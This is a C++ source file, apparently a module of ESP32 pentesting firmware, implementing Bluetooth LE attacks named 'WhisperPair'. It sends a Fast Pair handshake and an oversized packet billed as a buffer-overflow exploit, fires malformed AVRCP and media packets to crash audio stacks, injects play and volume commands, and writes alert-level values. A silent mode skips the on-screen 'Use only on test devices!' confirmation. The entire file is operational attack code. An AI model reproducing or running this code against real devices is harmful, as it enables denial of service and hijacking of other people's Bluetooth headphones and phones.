#include "whisperpair.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include <esp_heap_caps.h>
#include "globals.h"

extern GlobalState globalState;
extern BruceConfig bruceConfig;
extern TFT_eSPI tft;
extern int tftWidth, tftHeight;

// ============================================================================
// BLEAttackManager - FIXES CONNECTION CRASH
// ============================================================================

void BLEAttackManager::prepareForConnection() {
    Serial.println("[BLE] Preparing for attack connection...");
    
    wasScanning = false;
    
    if(NimBLEDevice::getInitialized()) {
        if(NimBLEDevice::getScan()) {
            wasScanning = NimBLEDevice::getScan()->isScanning();
            if(wasScanning) {
                Serial.println("[BLE] Stopping active scan...");
                NimBLEDevice::getScan()->stop();
                delay(350);
            }
        }
        
        Serial.println("[BLE] Deinitializing BLE...");
        NimBLEDevice::deinit(true);
        delay(500);
    }
    
    Serial.println("[BLE] Initializing for attack mode...");
    NimBLEDevice::init("Bruce-Attack");
    
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setSecurityAuth(false, false, false);
    NimBLEDevice::setMTU(247);
    
    isInAttackMode = true;
    delay(200);
}

void BLEAttackManager::cleanupAfterAttack() {
    if(!isInAttackMode) return;
    
    Serial.println("[BLE] Cleaning up attack mode...");
    
    if(NimBLEDevice::getInitialized()) {
        NimBLEDevice::deinit(false);
    }
    
    isInAttackMode = false;
    delay(300);
}

bool BLEAttackManager::connectToDevice(NimBLEAddress target, NimBLEClient** outClient) {
    if(!NimBLEDevice::getInitialized()) {
        Serial.println("[BLE] ERROR: BLE not initialized!");
        return false;
    }
    
    size_t freeHeap = esp_get_free_heap_size();
    Serial.printf("[BLE] Free heap: %d bytes\n", freeHeap);
    
    if(freeHeap < 40000) {
        Serial.println("[BLE] WARNING: Low heap");
        delay(500);
    }
    
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) {
        Serial.println("[BLE] ERROR: Failed to create client");
        return false;
    }
    
    pClient->setConnectTimeout(10);
    pClient->setConnectionParams(12, 12, 0, 400);
    
    Serial.printf("[BLE] Connecting to %s...\n", target.toString().c_str());
    
    bool connected = false;
    for(int attempt = 0; attempt < 2 && !connected; attempt++) {
        if(attempt > 0) {
            Serial.printf("[BLE] Retry attempt %d...\n", attempt + 1);
            delay(500);
        }
        
        connected = pClient->connect(target, true);
        
        if(connected) {
            int waitTries = 0;
            while(!pClient->isConnected() && waitTries < 20) {
                delay(100);
                waitTries++;
            }
            
            if(pClient->isConnected()) {
                Serial.println("[BLE] Connection established!");
                delay(200);
                break;
            } else {
                connected = false;
            }
        }
    }
    
    if(!connected) {
        Serial.println("[BLE] Connection failed after retries");
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    *outClient = pClient;
    return true;
}

// ============================================================================
// WhisperPairExploit - MAIN ATTACK
// ============================================================================

NimBLERemoteCharacteristic* WhisperPairExploit::findKBPCharacteristic(NimBLERemoteService* fastpairService) {
    if(!fastpairService) return nullptr;
    
    const char* kbpUuids[] = {
        "a92ee202-5501-4e6b-90fb-79a8c1f2e5a8",
        "1234",
        "fe2c1234-8366-4814-8eb0-01de32100bea",
        nullptr
    };
    
    for(int i = 0; kbpUuids[i] != nullptr; i++) {
        NimBLERemoteCharacteristic* ch = fastpairService->getCharacteristic(NimBLEUUID(kbpUuids[i]));
        if(ch && ch->canWrite()) {
            Serial.printf("[WhisperPair] Found KBP with UUID: %s\n", kbpUuids[i]);
            return ch;
        }
    }
    
    std::vector<NimBLERemoteCharacteristic*>* chars = fastpairService->getCharacteristics(true);
    if(chars) {
        for(auto& ch : *chars) {
            if(ch->canWrite()) {
                Serial.println("[WhisperPair] Found writable characteristic (fallback)");
                return ch;
            }
        }
    }
    
    return nullptr;
}

bool WhisperPairExploit::performHandshake(NimBLERemoteCharacteristic* kbpChar) {
    if(!kbpChar) return false;
    
    Serial.println("[WhisperPair] Performing handshake...");
    
    uint8_t public_key[65];
    size_t pub_len = 65;
    
    if(!crypto.generateValidKeyPair(public_key, &pub_len)) {
        Serial.println("[WhisperPair] Key generation failed!");
        return false;
    }
    
    uint8_t seeker_hello[67] = {0};
    seeker_hello[0] = 0x00;
    seeker_hello[1] = 0x00;
    memcpy(&seeker_hello[2], public_key, 65);
    
    bool success = kbpChar->writeValue(seeker_hello, 67, true);
    
    if(success) {
        Serial.println("[WhisperPair] Handshake sent");
        delay(300);
    } else {
        Serial.println("[WhisperPair] Handshake failed");
    }
    
    return success;
}

bool WhisperPairExploit::sendExploitPayload(NimBLERemoteCharacteristic* kbpChar) {
    if(!kbpChar) return false;
    
    Serial.println("[WhisperPair] Sending exploit payload...");
    
    uint8_t exploit_packet[120];
    
    exploit_packet[0] = 0x02;
    exploit_packet[1] = 0xFF;
    
    uint8_t fake_nonce[16];
    crypto.generateValidNonce(fake_nonce);
    memcpy(&exploit_packet[2], fake_nonce, 16);
    
    for(int i = 18; i < sizeof(exploit_packet); i++) {
        exploit_packet[i] = 0x41 + ((i - 18) % 26);
    }
    
    exploit_packet[sizeof(exploit_packet) - 1] = 0x00;
    
    bool sent = kbpChar->writeValue(exploit_packet, sizeof(exploit_packet), true);
    
    Serial.printf("[WhisperPair] Exploit packet sent: %s\n", sent ? "YES" : "NO");
    
    if(sent) {
        delay(600);
    }
    
    return sent;
}

bool WhisperPairExploit::testForVulnerability(NimBLERemoteCharacteristic* kbpChar) {
    if(!kbpChar) return false;
    
    Serial.println("[WhisperPair] Testing for vulnerability...");
    
    try {
        std::string response = kbpChar->readValue();
        
        if(response.empty()) {
            Serial.println("[WhisperPair] No response - possible crash!");
            return true;
        } else {
            Serial.printf("[WhisperPair] Device responded with %d bytes\n", response.length());
            
            if(response.length() < 5) {
                return true;
            }
        }
    } catch(...) {
        Serial.println("[WhisperPair] Exception during read - device might have crashed");
        return true;
    }
    
    return false;
}

bool WhisperPairExploit::execute(NimBLEAddress target) {
    if(!confirmAttack(target.toString().c_str())) {
        return false;
    }
    
    Serial.printf("[WhisperPair] Starting attack on %s\n", target.toString().c_str());
    
    showAttackProgress("Preparing BLE...");
    bleManager.prepareForConnection();
    
    showAttackProgress("Connecting...");
    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient)) {
        showAttackResult(false, "Connection failed");
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    showAttackProgress("Discovering services...");
    if(!pClient->discoverAttributes()) {
        showAttackResult(false, "Service discovery failed");
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    showAttackProgress("Finding FastPair...");
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        showAttackResult(false, "FastPair service not found");
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    showAttackProgress("Finding KBP characteristic...");
    NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
    if(!pKbpChar) {
        showAttackResult(false, "No writable KBP characteristic");
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    showAttackProgress("Target acquired!", TFT_GREEN);
    delay(500);
    
    bool isVulnerable = false;
    
    showAttackProgress("Sending handshake...");
    if(performHandshake(pKbpChar)) {
        delay(400);
        
        showAttackProgress("Sending exploit...", TFT_ORANGE);
        if(sendExploitPayload(pKbpChar)) {
            delay(400);
            
            showAttackProgress("Testing response...");
            isVulnerable = testForVulnerability(pKbpChar);
        }
    }
    
    showAttackProgress("Cleaning up...");
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    bleManager.cleanupAfterAttack();
    
    if(isVulnerable) {
        showAttackResult(true, "DEVICE MAY BE VULNERABLE!");
        return true;
    } else {
        showAttackResult(false, "Device appears patched");
        return false;
    }
}

bool WhisperPairExploit::executeSilent(NimBLEAddress target) {
    bleManager.prepareForConnection();
    
    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient)) {
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    if(!pClient->discoverAttributes()) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
    if(!pKbpChar) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    bool handshakeOk = performHandshake(pKbpChar);
    delay(300);
    bool exploitSent = sendExploitPayload(pKbpChar);
    delay(500);
    bool crashed = testForVulnerability(pKbpChar);
    
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    bleManager.cleanupAfterAttack();
    
    return (handshakeOk && exploitSent && crashed);
}

// ============================================================================
// AudioAttackService - AUDIO STACK ATTACKS
// ============================================================================

bool AudioAttackService::findAndAttackAudioServices(NimBLEClient* pClient) {
    if(!pClient || !pClient->isConnected()) return false;
    
    if(!pClient->discoverAttributes()) {
        return false;
    }
    
    bool anyAttackSuccess = false;
    
    std::vector<NimBLERemoteService*>* services = pClient->getServices(true);
    if(!services) return false;
    
    for(auto& service : *services) {
        NimBLEUUID uuid = service->getUUID();
        String uuidStr = uuid.toString();
        
        if(uuidStr.indexOf("110e") != -1 || uuidStr.indexOf("110f") != -1) {
            Serial.println("[AudioAttack] Found AVRCP service");
            if(attackAVRCP(service)) {
                anyAttackSuccess = true;
            }
        }
        
        else if(uuidStr.indexOf("1843") != -1 || uuidStr.indexOf("b4b4") != -1) {
            Serial.println("[AudioAttack] Found Media Control service");
            if(attackAudioMedia(service)) {
                anyAttackSuccess = true;
            }
        }
        
        else if(uuidStr.indexOf("1124") != -1 || uuidStr.indexOf("1125") != -1) {
            Serial.println("[AudioAttack] Found Telephony service");
            if(attackTelephony(service)) {
                anyAttackSuccess = true;
            }
        }
        
        else if(uuidStr.indexOf("1844") != -1) {
            Serial.println("[AudioAttack] Found Generic Media service");
            if(attackAudioMedia(service)) {
                anyAttackSuccess = true;
            }
        }
    }
    
    return anyAttackSuccess;
}

bool AudioAttackService::attackAVRCP(NimBLERemoteService* avrcpService) {
    if(!avrcpService) return false;
    
    Serial.println("[AudioAttack] Attacking AVRCP service...");
    
    NimBLERemoteCharacteristic* pChar = nullptr;
    
    const char* avrcpUuids[] = {
        "b4b40101-b4b4-4a8f-9deb-bc87b8e0a8f5",
        "0000110e-0000-1000-8000-00805f9b34fb",
        "0000110f-0000-1000-8000-00805f9b34fb",
        nullptr
    };
    
    for(int i = 0; avrcpUuids[i] != nullptr; i++) {
        pChar = avrcpService->getCharacteristic(NimBLEUUID(avrcpUuids[i]));
        if(pChar && pChar->canWrite()) break;
    }
    
    if(!pChar) {
        std::vector<NimBLERemoteCharacteristic*>* chars = avrcpService->getCharacteristics(true);
        if(chars) {
            for(auto& ch : *chars) {
                if(ch->canWrite()) {
                    pChar = ch;
                    break;
                }
            }
        }
    }
    
    if(!pChar) {
        Serial.println("[AudioAttack] No writable AVRCP characteristic found");
        return false;
    }
    
    Serial.println("[AudioAttack] Sending media commands...");
    
    uint8_t playCmd[] = {0x00, 0x48, 0x00, 0x00, 0x00};
    bool playSent = pChar->writeValue(playCmd, sizeof(playCmd), true);
    
    delay(200);
    
    uint8_t volUpCmd[] = {0x00, 0x44, 0x00, 0x00, 0x00};
    bool volSent = pChar->writeValue(volUpCmd, sizeof(volUpCmd), true);
    
    delay(200);
    
    Serial.println("[AudioAttack] Sending malformed AVRCP packets...");
    
    uint8_t oversizedPacket[256];
    memset(oversizedPacket, 0x41, sizeof(oversizedPacket));
    oversizedPacket[0] = 0xFF;
    oversizedPacket[1] = 0xFF;
    
    bool crashSent = pChar->writeValue(oversizedPacket, sizeof(oversizedPacket), true);
    
    delay(300);
    uint8_t invalidState[] = {0x00, 0xFF, 0xFF, 0xFF, 0xFF};
    bool stateSent = pChar->writeValue(invalidState, sizeof(invalidState), true);
    
    return (playSent || volSent || crashSent || stateSent);
}

bool AudioAttackService::attackAudioMedia(NimBLERemoteService* mediaService) {
    if(!mediaService) return false;
    
    Serial.println("[AudioAttack] Attacking Media service...");
    
    NimBLERemoteCharacteristic* pMediaChar = nullptr;
    
    const char* mediaUuids[] = {
        "b4b40201-b4b4-4a8f-9deb-bc87b8e0a8f5",
        "00002b01-0000-1000-8000-00805f9b34fb",
        "00002b02-0000-1000-8000-00805f9b34fb",
        nullptr
    };
    
    for(int i = 0; mediaUuids[i] != nullptr; i++) {
        pMediaChar = mediaService->getCharacteristic(NimBLEUUID(mediaUuids[i]));
        if(pMediaChar && pMediaChar->canWrite()) break;
    }
    
    if(!pMediaChar) {
        std::vector<NimBLERemoteCharacteristic*>* chars = mediaService->getCharacteristics(true);
        if(chars) {
            for(auto& ch : *chars) {
                if(ch->canWrite()) {
                    pMediaChar = ch;
                    break;
                }
            }
        }
    }
    
    if(!pMediaChar) {
        Serial.println("[AudioAttack] No writable Media characteristic found");
        return false;
    }
    
    uint8_t commands[][5] = {
        {0x01, 0x00, 0x00, 0x00, 0x00},
        {0x02, 0x00, 0x00, 0x00, 0x00},
        {0x03, 0x00, 0x00, 0x00, 0x00},
        {0x04, 0x00, 0x00, 0x00, 0x00},
        {0x05, 0x00, 0x00, 0x00, 0x00},
        {0x06, 0x00, 0x00, 0x00, 0x00},
        {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
    };
    
    bool anySent = false;
    for(int i = 0; i < 7; i++) {
        bool sent = pMediaChar->writeValue(commands[i], 5, true);
        if(sent) anySent = true;
        delay(150);
    }
    
    return anySent;
}

bool AudioAttackService::attackTelephony(NimBLERemoteService* teleService) {
    if(!teleService) return false;
    
    Serial.println("[AudioAttack] Attacking Telephony service...");
    
    NimBLERemoteCharacteristic* pAlertChar = nullptr;
    
    const char* alertUuids[] = {
        "00002a43-0000-1000-8000-00805f9b34fb",
        "00002a44-0000-1000-8000-00805f9b34fb",
        "00002a45-0000-1000-8000-00805f9b34fb",
        nullptr
    };
    
    for(int i = 0; alertUuids[i] != nullptr; i++) {
        pAlertChar = teleService->getCharacteristic(NimBLEUUID(alertUuids[i]));
        if(pAlertChar && pAlertChar->canWrite()) break;
    }
    
    if(!pAlertChar) {
        return false;
    }
    
    uint8_t alertHigh[] = {0x02};
    uint8_t alertMild[] = {0x01};
    uint8_t alertOff[] = {0x00};
    uint8_t invalidAlert[] = {0xFF};
    
    bool alert1 = pAlertChar->writeValue(alertHigh, 1, true);
    delay(300);
    bool alert2 = pAlertChar->writeValue(alertMild, 1, true);
    delay(300);
    bool alert3 = pAlertChar->writeValue(invalidAlert, 1, true);
    
    return (alert1 || alert2 || alert3);
}

bool AudioAttackService::executeAudioAttack(NimBLEAddress target) {
    Serial.printf("[AudioAttack] Starting audio attack on %s\n", target.toString().c_str());
    
    BLEAttackManager bleManager;
    bleManager.prepareForConnection();
    
    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient)) {
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    bool success = findAndAttackAudioServices(pClient);
    
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    bleManager.cleanupAfterAttack();
    
    return success;
}

bool AudioAttackService::injectMediaCommands(NimBLEAddress target) {
    return executeAudioAttack(target);
}

bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
    BLEAttackManager bleManager;
    bleManager.prepareForConnection();
    
    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient)) {
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    if(!pClient->discoverAttributes()) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
    if(!pService) {
        pService = pClient->getService(NimBLEUUID((uint16_t)0x110F));
    }
    
    if(!pService) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    NimBLERemoteCharacteristic* pChar = nullptr;
    std::vector<NimBLERemoteCharacteristic*>* chars = pService->getCharacteristics(true);
    if(chars) {
        for(auto& ch : *chars) {
            if(ch->canWrite()) {
                pChar = ch;
                break;
            }
        }
    }
    
    if(!pChar) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }
    
    uint8_t crashPacket1[128];
    uint8_t crashPacket2[64];
    uint8_t crashPacket3[256];
    
    memset(crashPacket1, 0xFF, sizeof(crashPacket1));
    memset(crashPacket2, 0x00, sizeof(crashPacket2));
    memset(crashPacket3, 0x41, sizeof(crashPacket3));
    
    bool sent1 = pChar->writeValue(crashPacket1, sizeof(crashPacket1), true);
    delay(200);
    bool sent2 = pChar->writeValue(crashPacket2, sizeof(crashPacket2), true);
    delay(200);
    bool sent3 = pChar->writeValue(crashPacket3, sizeof(crashPacket3), true);
    
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    bleManager.cleanupAfterAttack();
    
    return (sent1 || sent2 || sent3);
}

// ============================================================================
// UI Helper Functions
// ============================================================================

void showAttackProgress(const char* message, uint32_t color) {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("WHISPERPAIR");
    tft.setTextColor(color, bruceConfig.bgColor);
    tft.setCursor(20, 80);
    tft.print(message);
    
    static uint8_t spinnerPos = 0;
    const char* spinner = "|/-\\";
    tft.setCursor(tftWidth - 40, 80);
    tft.print(spinner[spinnerPos % 4]);
    spinnerPos++;
}

void showAttackResult(bool success, const char* message) {
    if(success) {
        tft.fillScreen(TFT_GREEN);
        drawMainBorderWithTitle("SUCCESS");
        tft.setTextColor(TFT_BLACK, TFT_GREEN);
    } else {
        tft.fillScreen(TFT_RED);
        drawMainBorderWithTitle("FAILED");
        tft.setTextColor(TFT_WHITE, TFT_RED);
    }
    
    tft.setCursor(20, 80);
    if(message) {
        tft.print(message);
    } else {
        tft.print(success ? "Attack successful!" : "Attack failed");
    }
    
    tft.fillRoundRect(tftWidth/2 - 40, 150, 80, 35, 5, TFT_BLACK);
    tft.setTextColor(success ? TFT_GREEN : TFT_RED, TFT_BLACK);
    tft.setCursor(tftWidth/2 - 15, 157);
    tft.print("OK");
    
    tft.setTextColor(success ? TFT_BLACK : TFT_WHITE, success ? TFT_GREEN : TFT_RED);
    tft.setCursor(20, 200);
    tft.print("Press SEL to continue...");
    
    while(!check(SelPress)) {
        delay(50);
    }
    delay(200);
}

bool confirmAttack(const char* targetName) {
    clearMenu();
    drawMainBorderWithTitle("CONFIRM ATTACK");
    
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Target: ");
    tft.println(targetName);
    
    tft.setCursor(20, 90);
    tft.println("This will attempt to exploit");
    tft.setCursor(20, 110);
    tft.println("FastPair buffer overflow.");
    
    tft.setCursor(20, 140);
    tft.println("Use only on test devices!");
    
    tft.fillRect(20, 170, tftWidth - 40, 60, bruceConfig.bgColor);
    
    tft.fillRoundRect(50, 175, 80, 35, 5, TFT_GREEN);
    tft.setTextColor(TFT_BLACK, TFT_GREEN);
    tft.setCursor(65, 182);
    tft.print("YES");
    
    tft.fillRoundRect(150, 175, 80, 35, 5, TFT_RED);
    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.setCursor(170, 182);
    tft.print("NO");
    
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 230);
    tft.print("SEL: Yes  NEXT: No  ESC: Cancel");
    
    while(true) {
        if(check(EscPress)) {
            return false;
        }
        if(check(SelPress)) {
            return true;
        }
        if(check(NextPress)) {
            return false;
        }
        delay(50);
    }
}

// ============================================================================
// Attack Execution Functions
// ============================================================================

void runWhisperPairAttack() {
    WhisperPairExploit exploit;
    exploit.execute(globalState.currentTarget);
}

void runAudioStackCrash() {
    if(!confirmAttack("Crash audio stack?")) {
        return;
    }
    
    showAttackProgress("Attacking audio stack...");
    AudioAttackService audioAttack;
    bool result = audioAttack.crashAudioStack(globalState.currentTarget);
    showAttackResult(result, result ? "Audio stack attack sent!" : "Attack failed");
}

void runMediaCommandHijack() {
    if(!confirmAttack("Inject media commands?")) {
        return;
    }
    
    showAttackProgress("Injecting media commands...");
    AudioAttackService audioAttack;
    bool result = audioAttack.injectMediaCommands(globalState.currentTarget);
    showAttackResult(result, result ? "Media commands sent!" : "No media service found");
}

void runQuickTest() {
    showAttackProgress("Quick testing...");
    WhisperPairExploit exploit;
    bool result = exploit.executeSilent(globalState.currentTarget);
    showAttackResult(result, result ? "VULNERABLE!" : "Patched/Safe");
}

// ============================================================================
// Main Menu Function
// ============================================================================

void whisperPairMenu() {
    if(globalState.currentTarget.toString() == "00:00:00:00:00:00") {
        showAdaptiveMessage("No target selected", "OK", "", "", TFT_RED, true, false);
        return;
    }
    
    clearMenu();
    drawMainBorderWithTitle("WHISPERPAIR");
    
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 50);
    tft.print("Target: ");
    tft.println(globalState.currentTarget.toString().c_str());
    
    tft.setCursor(20, 80);
    tft.println("FastPair & Audio Stack Attacks");
    
    tft.fillRect(20, 120, tftWidth - 40, 140, bruceConfig.bgColor);
    
    tft.fillRoundRect(30, 125, tftWidth - 60, 30, 5, TFT_DARKGREY);
    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
    tft.setCursor(40, 130);
    tft.print("SEL: FastPair Buffer Overflow");
    
    tft.fillRoundRect(30, 160, tftWidth - 60, 30, 5, TFT_DARKGREY);
    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
    tft.setCursor(40, 165);
    tft.print("NEXT: Audio Stack Crash");
    
    tft.fillRoundRect(30, 195, tftWidth - 60, 30, 5, TFT_DARKGREY);
    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
    tft.setCursor(40, 200);
    tft.print("PREV: Media Control Hijack");
    
    tft.fillRoundRect(30, 230, tftWidth - 60, 30, 5, TFT_DARKGREY);
    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
    tft.setCursor(40, 235);
    tft.print("U/D: Quick Test (silent)");
    
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 280);
    tft.print("ESC: Back");
    
    while(true) {
        if(check(EscPress)) {
            delay(200);
            return;
        }
        if(check(SelPress)) {
            delay(200);
            runWhisperPairAttack();
            return;
        }
        if(check(NextPress)) {
            delay(200);
            runAudioStackCrash();
            return;
        }
        if(check(PrevPress)) {
            delay(200);
            runMediaCommandHijack();
            return;
        }
        if(check(UpPress) || check(DownPress)) {
            delay(200);
            runQuickTest();
            return;
        }
        delay(50);
    }
}